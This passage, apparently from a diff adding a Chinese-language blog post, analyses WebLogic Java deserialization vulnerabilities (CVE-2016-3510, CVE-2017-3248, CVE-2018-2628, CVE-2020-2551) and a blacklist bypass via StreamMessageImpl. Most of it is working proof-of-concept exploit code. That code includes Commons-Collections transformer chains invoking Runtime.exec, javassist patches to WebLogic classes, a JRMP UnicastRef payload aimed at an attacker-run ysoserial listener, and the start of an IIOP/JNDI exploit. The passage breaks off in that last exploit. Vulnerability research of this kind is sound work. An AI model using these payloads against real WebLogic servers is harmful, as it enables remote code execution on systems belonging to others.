+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">while</span>(<span style="color:#66d9ef">true</span>) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">writeObject</span>(var5.<span style="color:#a6e22e">readObject</span>());
+</span></span><span style="display:flex;"><span>................
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>可以调用原生的<code>readObject</code>方法，绕过黑名单。</p>
+<p>这个类需要自己生成：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cd WL_HOME/server/lib
+</span></span><span style="display:flex;"><span>java -jar ../../../modules/com.bea.core.jarbuilder_X.X.X.X.jar
+</span></span></code></pre></div><p>生成的<code>wlfullclient.jar</code>复制出来导入idea。</p>
+<p>对应的<code>StreamMessageImpl</code>类也有一个<code>writeExternal</code>方法，不过不可控，用javassist改一下，然后序列化时会将CC链的序列化数据写入External数据部分，poc代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Exp</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        String command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> String<span style="color:#f92672">[]</span> execArgs <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span> { command };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> Transformer<span style="color:#f92672">[]</span> transformers <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> ConstantTransformer(Runtime.<span style="color:#a6e22e">class</span>),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;getMethod&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span> {
+</span></span><span style="display:flex;"><span>                        String.<span style="color:#a6e22e">class</span>, Class<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span> }, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;getRuntime&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> }),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;invoke&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span> {
+</span></span><span style="display:flex;"><span>                        Object.<span style="color:#a6e22e">class</span>, Object<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span> }, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> }),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;exec&#34;</span>,
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span> { String.<span style="color:#a6e22e">class</span> }, execArgs),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> ConstantTransformer(1) };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Transformer transformerChain <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer(transformers);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> Map innerMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> Map lazyMap <span style="color:#f92672">=</span> LazyMap.<span style="color:#a6e22e">decorate</span>(innerMap, transformerChain);
+</span></span><span style="display:flex;"><span>        TiedMapEntry entry <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TiedMapEntry(lazyMap, <span style="color:#e6db74">&#34;foo&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        HashSet map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashSet(1);
+</span></span><span style="display:flex;"><span>        map.<span style="color:#a6e22e">add</span>(<span style="color:#e6db74">&#34;foo&#34;</span>);
+</span></span><span style="display:flex;"><span>        HashMap innimpl <span style="color:#f92672">=</span> (HashMap) getFieldValue(map, <span style="color:#e6db74">&#34;map&#34;</span>);
+</span></span><span style="display:flex;"><span>        Object<span style="color:#f92672">[]</span> array <span style="color:#f92672">=</span> (Object<span style="color:#f92672">[]</span>) getFieldValue(innimpl, <span style="color:#e6db74">&#34;table&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Object node <span style="color:#f92672">=</span> array<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(node <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>){
+</span></span><span style="display:flex;"><span>            node <span style="color:#f92672">=</span> array<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        setFieldValue(node, <span style="color:#e6db74">&#34;key&#34;</span>, entry);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> data <span style="color:#f92672">=</span> ser(map);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        String base64Code <span style="color:#f92672">=</span> Base64.<span style="color:#a6e22e">getEncoder</span>().<span style="color:#a6e22e">encodeToString</span>(data);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> length <span style="color:#f92672">=</span> data.<span style="color:#a6e22e">length</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ClassPool pool <span style="color:#f92672">=</span> ClassPool.<span style="color:#a6e22e">getDefault</span>();
+</span></span><span style="display:flex;"><span>        CtClass ctClass0 <span style="color:#f92672">=</span> pool.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;weblogic.jms.common.StreamMessageImpl&#34;</span>);
+</span></span><span style="display:flex;"><span>        CtMethod writeReplace <span style="color:#f92672">=</span> ctClass0.<span style="color:#a6e22e">getDeclaredMethod</span>(<span style="color:#e6db74">&#34;writeExternal&#34;</span>);
+</span></span><span style="display:flex;"><span>        String code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;{\n&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;System.out.println(1);\n&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;super.writeExternal($1);\n&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;java.io.ObjectOutput out = (java.io.ObjectOutput) $1;\n&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;out.writeByte(1);\n&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;\n&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;int length = &#34;</span> <span style="color:#f92672">+</span> length <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;;\n&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;String base64Code = \&#34;&#34;</span><span style="color:#f92672">+</span> base64Code <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\&#34;;\n&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;byte[] buffer = java.util.Base64.getDecoder().decode(base64Code);\n&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;\n&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;out.writeInt(length);\n&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;out.write(buffer);}&#34;</span>;
+</span></span><span style="display:flex;"><span>        writeReplace.<span style="color:#a6e22e">setBody</span>(code);
+</span></span><span style="display:flex;"><span>        ctClass0.<span style="color:#a6e22e">detach</span>();
+</span></span><span style="display:flex;"><span>        ctClass0.<span style="color:#a6e22e">toClass</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        StreamMessageImpl streamMessage <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StreamMessageImpl();
+</span></span><span style="display:flex;"><span>        serToFile(streamMessage);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>然后再用python脚本发送即可。</p>
+<h2 id="cve-2016-3510-readresolve绕过">CVE-2016-3510 (readResolve绕过)<a hidden class="anchor" aria-hidden="true" href="#cve-2016-3510-readresolve绕过">#</a></h2>
+<blockquote>
+<p>Weblogic 10.3.6</p>
+<p>JDK8u65</p>
+</blockquote>
+<p><code>CVE-2015-4852</code>的另一种绕过。</p>
+<p>还是之前分析的<code>ObjectInputStream#readOrdinaryObject</code>方法：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> Object <span style="color:#a6e22e">readOrdinaryObject</span>(<span style="color:#66d9ef">boolean</span> unshared)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">throws</span> IOException
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    .............
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (desc.<span style="color:#a6e22e">isExternalizable</span>()) {
+</span></span><span style="display:flex;"><span>        readExternalData((Externalizable) obj, desc);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        readSerialData(obj, desc);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    handles.<span style="color:#a6e22e">finish</span>(passHandle);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (obj <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span>
+</span></span><span style="display:flex;"><span>        handles.<span style="color:#a6e22e">lookupException</span>(passHandle) <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span>
+</span></span><span style="display:flex;"><span>        desc.<span style="color:#a6e22e">hasReadResolveMethod</span>())
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        Object rep <span style="color:#f92672">=</span> desc.<span style="color:#a6e22e">invokeReadResolve</span>(obj);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (unshared <span style="color:#f92672">&amp;&amp;</span> rep.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">isArray</span>()) {
+</span></span><span style="display:flex;"><span>            rep <span style="color:#f92672">=</span> cloneArray(rep);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (rep <span style="color:#f92672">!=</span> obj) {
+</span></span><span style="display:flex;"><span>            handles.<span style="color:#a6e22e">setObject</span>(passHandle, obj <span style="color:#f92672">=</span> rep);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> obj;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>在检查完<code>isExternalizable</code>后会再检查是否具有<code>readResolve</code>方法，有的话就调用。</p>
+<p><code>weblogic.corba.utils.MarshalledObject</code>的<code>readResolve</code>的方法可以进行二次反序列化：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">readResolve</span>() <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException, ObjectStreamException {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">objBytes</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        ByteArrayInputStream var1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayInputStream(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">objBytes</span>);
+</span></span><span style="display:flex;"><span>        ObjectInputStream var2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(var1);
+</span></span><span style="display:flex;"><span>        Object var3 <span style="color:#f92672">=</span> var2.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>        var2.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> var3;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>这个类也在<code>wlfullclient.jar</code>里，需要自己生成。</p>
+<p>poc代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Exp</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        String command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> String<span style="color:#f92672">[]</span> execArgs <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span> { command };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> Transformer<span style="color:#f92672">[]</span> transformers <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> ConstantTransformer(Runtime.<span style="color:#a6e22e">class</span>),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;getMethod&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span> {
+</span></span><span style="display:flex;"><span>                        String.<span style="color:#a6e22e">class</span>, Class<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span> }, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;getRuntime&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> }),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;invoke&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span> {
+</span></span><span style="display:flex;"><span>                        Object.<span style="color:#a6e22e">class</span>, Object<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span> }, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> }),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;exec&#34;</span>,
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span> { String.<span style="color:#a6e22e">class</span> }, execArgs),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> ConstantTransformer(1) };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Transformer transformerChain <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer(transformers);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> Map innerMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> Map lazyMap <span style="color:#f92672">=</span> LazyMap.<span style="color:#a6e22e">decorate</span>(innerMap, transformerChain);
+</span></span><span style="display:flex;"><span>        TiedMapEntry entry <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TiedMapEntry(lazyMap, <span style="color:#e6db74">&#34;foo&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        HashSet map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashSet(1);
+</span></span><span style="display:flex;"><span>        map.<span style="color:#a6e22e">add</span>(<span style="color:#e6db74">&#34;foo&#34;</span>);
+</span></span><span style="display:flex;"><span>        HashMap innimpl <span style="color:#f92672">=</span> (HashMap) getFieldValue(map, <span style="color:#e6db74">&#34;map&#34;</span>);
+</span></span><span style="display:flex;"><span>        Object<span style="color:#f92672">[]</span> array <span style="color:#f92672">=</span> (Object<span style="color:#f92672">[]</span>) getFieldValue(innimpl, <span style="color:#e6db74">&#34;table&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Object node <span style="color:#f92672">=</span> array<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(node <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>){
+</span></span><span style="display:flex;"><span>            node <span style="color:#f92672">=</span> array<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        setFieldValue(node, <span style="color:#e6db74">&#34;key&#34;</span>, entry);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        MarshalledObject marshalledObject <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> MarshalledObject(map);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        serToFile(marshalledObject);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="cve-2017-3248">CVE-2017-3248<a hidden class="anchor" aria-hidden="true" href="#cve-2017-3248">#</a></h2>
+<blockquote>
+<p>Weblogic 10.3.6</p>
+<p>JDK8u65</p>
+</blockquote>
+<p>JRMP协议也可以触发readObject。</p>
+<p>使用ysoserial的JRMPListener即可。</p>
+<p>补丁添加的黑名单.</p>
+<h2 id="cve-2018-2628">CVE-2018-2628<a hidden class="anchor" aria-hidden="true" href="#cve-2018-2628">#</a></h2>
+<blockquote>
+<p>Weblogic 10.3.6</p>
+<p>JDK8u65</p>
+</blockquote>
+<p>JRMP的<code>UnicastRef</code>类有<code>readExternal</code>方法，可以直接用这个类来反序列化绕过黑名单检测。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readExternal</span>(ObjectInput var1) <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">ref</span> <span style="color:#f92672">=</span> LiveRef.<span style="color:#a6e22e">read</span>(var1, <span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>最终也会触发TCPEndpoint连接，触发JRMP反序列化。</p>
+<p>poc:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Exp</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        String host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ip&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> port <span style="color:#f92672">=</span> ;
+</span></span><span style="display:flex;"><span>        ObjID id <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjID(<span style="color:#66d9ef">new</span> Random().<span style="color:#a6e22e">nextInt</span>()); <span style="color:#75715e">// RMI registry</span>
+</span></span><span style="display:flex;"><span>        TCPEndpoint te <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TCPEndpoint(host, port);
+</span></span><span style="display:flex;"><span>        UnicastRef ref <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> UnicastRef(<span style="color:#66d9ef">new</span> LiveRef(id, te, <span style="color:#66d9ef">false</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        serToFile(ref);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>ip和port指向ysoserial的JRMPListener监听的地址。</p>
+<h1 id="iiop协议反序列化">IIOP协议反序列化<a hidden class="anchor" aria-hidden="true" href="#iiop协议反序列化">#</a></h1>
+<p>Weblogic IIOP协议默认开启，跟T3协议一起监听在7001端口</p>
+<p>Common Object Request Broker Architecture（公共对象请求代理体系结构）是由OMG(Object Management Group)组织制定的一种标准分布式对象结构。使用平台无关的语言IDL（interface definition language）描述连接到远程对象的接口，然后将其映射到制定的语言实现。
+一般来说CORBA将其结构分为三部分：</p>
+<ul>
+<li>naming service</li>
+<li>client side</li>
+<li>servant side</li>
+</ul>
+<p>GIOP全称（General Inter-ORB Protocol）通用对象请求协议，其功能简单来说就是CORBA用来进行数据传输的协议。GIOP针对不同的通信层有不同的具体实现，而针对于TCP/IP层，其实现名为IIOP（Internet Inter-ORB Protocol）。所以说通过TCP协议传输的GIOP数据可以称为IIOP。</p>
+<p>RMI-IIOP出现以前，只有RMI和CORBA两种选择来进行分布式程序设计，二者之间不能协作。但是现在有了RMI-IIOP，稍微修改代码即可实现RMI客户端使用IIOP协议操作服务端CORBA对象，这样综合了RMI的简单性和CORBA的多语言性兼容性，RMI-IIOP克服了RMI只能用于Java的缺点和CORBA的复杂性。</p>
+<h2 id="网路问题">网路问题<a hidden class="anchor" aria-hidden="true" href="#网路问题">#</a></h2>
+<p>IIOP在bind时会绑定在<code>0.0.0.0</code>上，默认只能带本地。</p>
+<p>可以尝试修改IIOP的部分实现代码。我这里用javassist修改了<code>weblogic.iiop.IOPProfile#read</code>，强制改为指定的ip。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>String ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>String port <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;7001&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ClassPool pool <span style="color:#f92672">=</span> ClassPool.<span style="color:#a6e22e">getDefault</span>();
+</span></span><span style="display:flex;"><span>CtClass IOPProfileCtClass <span style="color:#f92672">=</span> pool.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;weblogic.iiop.IOPProfile&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CtMethod read <span style="color:#f92672">=</span> IOPProfileCtClass.<span style="color:#a6e22e">getDeclaredMethod</span>(<span style="color:#e6db74">&#34;read&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>String code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;this.host = \&#34;&#34;</span> <span style="color:#f92672">+</span> ip <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\&#34;;&#34;</span>;
+</span></span><span style="display:flex;"><span>read.<span style="color:#a6e22e">insertAfter</span>(code);
+</span></span><span style="display:flex;"><span>IOPProfileCtClass.<span style="color:#a6e22e">detach</span>();
+</span></span><span style="display:flex;"><span>IOPProfileCtClass.<span style="color:#a6e22e">toClass</span>();
+</span></span></code></pre></div><h2 id="cve-2020-2551">CVE-2020-2551<a hidden class="anchor" aria-hidden="true" href="#cve-2020-2551">#</a></h2>
+<blockquote>
+<p>Weblogic 10.3.6</p>
+<p>JDK8u65</p>
+</blockquote>
+<p>与JRMP类似，IIOP协议在不同组件之间通信是通过序列化/反序列化。</p>
+<p><code>JtaTransactionManager</code>类本身不在黑名单里了，但其父类<code>AbstractPlatformTransactionManager</code>在黑名单里，T3协议使用resolveClass过滤，这个方法也会检测父类，可以过滤<code>JtaTransactionManager</code>类，而IIOP协议不使用resolveClass，所以不会过滤，所以无法根据父类将其过滤。</p>
+<p><code>JtaTransactionManager</code>在反序列化时会通过JNDI去加载对象。</p>
+<p>poc如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Exp</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        String ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>        String port <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;7001&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ClassPool pool <span style="color:#f92672">=</span> ClassPool.<span style="color:#a6e22e">getDefault</span>();
+</span></span><span style="display:flex;"><span>        CtClass IOPProfileCtClass <span style="color:#f92672">=</span> pool.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;weblogic.iiop.IOPProfile&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        CtMethod read <span style="color:#f92672">=</span> IOPProfileCtClass.<span style="color:#a6e22e">getDeclaredMethod</span>(<span style="color:#e6db74">&#34;read&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        String code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;this.host = \&#34;&#34;</span> <span style="color:#f92672">+</span> ip <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\&#34;;&#34;</span>;
+</span></span><span style="display:flex;"><span>        read.<span style="color:#a6e22e">insertAfter</span>(code);
+</span></span><span style="display:flex;"><span>        IOPProfileCtClass.<span style="color:#a6e22e">detach</span>();
+</span></span><span style="display:flex;"><span>        IOPProfileCtClass.<span style="color:#a6e22e">toClass</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            Hashtable<span style="color:#f92672">&lt;</span>String, String<span style="color:#f92672">&gt;</span> env <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Hashtable<span style="color:#f92672">&lt;</span>String, String<span style="color:#f92672">&gt;</span>();
